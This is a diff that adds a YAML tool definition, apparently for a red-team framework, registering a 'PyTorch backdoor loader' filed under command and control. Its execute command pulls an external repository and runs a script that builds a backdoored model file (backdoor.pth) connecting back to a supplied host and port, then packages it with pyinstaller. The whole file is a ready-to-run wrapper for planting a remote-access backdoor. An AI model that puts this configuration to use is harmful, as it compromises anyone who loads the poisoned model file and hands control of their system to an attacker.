@@ -1,0 +1,25 @@
+name: pytbackdoorch
+description: 'a Simpliest pythorch backdoor loader framework
+  '
+author: LazyOwn RedTeam
+version: '1.0'
+enabled: true
+params:
+- name: lhost
+  type: string
+  required: true
+  description: lhost target.
+- name: lport
+  type: string
+  required: true
+  description: lport target.
+os: any
+trigger: []
+tool:
+  name: pytbackdoorch
+  repo_url: https://github.com/grisuno/pytbackdoorch.git
+  install_path: external/.exploit/pytbackdoorch
+  install_command: pip install torch ; pip install pyinstaller ; 
+  execute_command: git restore . ; git pull ; chmod +x *.sh && python backdoor.py -H {lhost} -P {lport} -o backdoor.pth ; bash pysintaller.sh
+
+category: 10. Command & Control
